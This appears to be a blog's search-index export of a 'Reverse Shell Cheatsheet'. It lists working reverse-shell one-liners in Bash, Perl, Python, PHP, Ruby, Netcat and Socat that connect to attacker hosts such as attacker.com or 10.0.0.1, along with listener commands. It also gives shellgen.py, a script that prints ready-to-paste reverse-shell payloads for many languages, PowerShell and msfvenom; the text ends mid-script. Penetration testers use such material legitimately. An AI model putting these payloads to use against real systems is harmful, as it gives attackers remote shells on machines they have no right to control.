[{"categories":[],"content":"Linux Reverse shell CheatSheet ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:0:0","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"Bash bash -i \u003e\u0026 /dev/tcp/10.0.0.1/8080 0\u003e\u00261 export RHOST=attacker.com export RPORT=12345 bash -c 'exec bash -i \u0026\u003e/dev/tcp/$RHOST/$RPORT \u003c\u00261' ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:1:0","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"Perl perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:2:0","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:3:0","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"PHP php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:4:0","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"Ruby ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:5:0","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"Netcat rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.0.0.1 1234 \u003e/tmp/f ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:6:0","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"Netcat Listener nc -lvnp 1234 ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:6:1","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"SocatðŸ˜º RHOST=attacker.com RPORT=12345 socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:7:0","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"Socat Listener socat file:`tty`,raw,echo=0 tcp-listen:12345 ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:7:1","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"shellgen.py A simple reverse shell generator for windows and linux using tun0 and a specified listening port. ","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:8:0","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"},{"categories":[],"content":"python3 shellgen.py [port] #! /usr/bin/env python3 # Reverse shell generator based on examples pulled from: # https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md # http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet # This is uses the tun0 IPv4 address. Just specify a listening port. copy. paste. go. import sys import os if len(sys.argv) != 2: print(\"Usage: ./shellgen.py PORT\") else: ip = os.popen('ip addr show tun0').read().split(\"inet \")[1].split(\"/\")[0] port = sys.argv[1] print((\"\\033[1;32m[*]tun0 IP: \" + ip + \" port: \" + port)) bash = \"bash -i \u003e\u0026 /dev/tcp/\"+ip+\"/\"+port+\" 0\u003e\u00261\" bash2 = \"0\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/\"+ip+\"/\"+port+\"; sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196\" go = \"\"\"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\\\"tcp\",\\\"\"\"\"+ip+\"\"\":\"\"\"+port+\"\"\"\\\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' \u003e /tmp/t.go \u0026\u0026 go run /tmp/t.go \u0026\u0026 rm /tmp/t.go\"\"\" nc = \"\"\"nc -e /bin/sh \"\"\"+ip+\"\"\" \"\"\"+port nc2 = \"\"\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc \"\"\"+ip+\"\"\" \"\"\"+port+\"\"\" \u003e/tmp/f\"\"\" ncatssl = \"\"\"ncat --ssl -vv -l -p \"\"\"+port+\"\"\"\\nmkfifo /tmp/s; /bin/sh -i \u003c /tmp/s 2\u003e\u00261 | openssl s_client -quiet -connect \\\"\"\"\"+ip+\"\"\":\"\"\"+port+\"\"\"\\\"\u003e /tmp/s; rm /tmp/s\"\"\" lin_sl = \"\"\"msfvenom -p linux/x86/shell_reverse_tcp LHOST=\"\"\"+ip+\"\"\" LPORT=\"\"\"+port+\"\"\" -f elf \u003ereverse.elf\"\"\" perl= \"\"\"perl -e 'use Socket;$i=\\\"\"\"\" + ip + \"\"\"\";$p=\"\"\"+port+\"\"\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};'\"\"\" php = \"\"\"php -r '$sock=fsockopen(\\\"\"\"\"+ip+\"\"\"\",\"\"\"+port+\"\"\");exec(\"/bin/sh \u003ci \u003c\u00263 \u003e\u00263 2\u003e\u00263\");'\"\"\" php2 = \"\"\"php -r '$sock=fsockopen(\\\"\"\"\"+ip+\"\"\"\",\"\"\"+port+\"\"\");$proc=proc_open(\"/bin/sh -i\", array(0=\u003e$sock, 1=\u003e$sock, 2=\u003e$sock),$pipes);'\"\"\" powershell1 = \"\"\"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\\\"\"\"\"+ip+\"\"\"\",\"\"\"+port+\"\"\");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u003e\u00261 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"\u003e \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\"\" powershell2 = \"\"\"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\\'\"\"\"+ip+\"\"\"\\',\"\"\"+port+\"\"\");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u003e\u00261 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\"\" python = \"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"\"\"\"+ip+\"\"\"\",\"\"\"+port+\"\"\"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"\"\" python2 = \"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"\"\"\"+ip+\"\"\"\",\"\"\"+port+\"\"\"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\"\"\" ruby = \"\"\"ruby -rsocket -e'f=TCPSocket.open(\\\"\"\"\"+ip+\"\"\"\",\"\"\"+port+\"\"\").to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d\u003e\u0026%d2\u003e\u0026%d\", f,f,f)'\"\"\" win_sl = \"\"\"msfvenom -p windows/shell_reverse_tcp LHOST=\"\"\"+ip+\"\"\" LPORT=\"\"\"+port+\"\"\" -f exe \u003e reverse.exe\"\"\" xterm = \"\"\"xterm -display \"\"\"+ip+\"\"\":\"\"\"+port print(\"\") print(\"\\033[1;35m[*] BASH\\033[1;m\\n\" + bash + \"\") print(\"\\033[1;35m[*] BASH2\\033[1;m\\n\" + bash2 + \"\\n\") print(\"\\033[1;35m[*] GO\\033[1;m\\n\" + go + \"\\n\") print(\"\\033[1;35m[*] L","date":"2021-08-18","objectID":"/reverse-shell-cheatsheet/:8:1","tags":[],"title":"Reverse Shell Cheatsheet","uri":"/reverse-shell-cheatsheet/"}]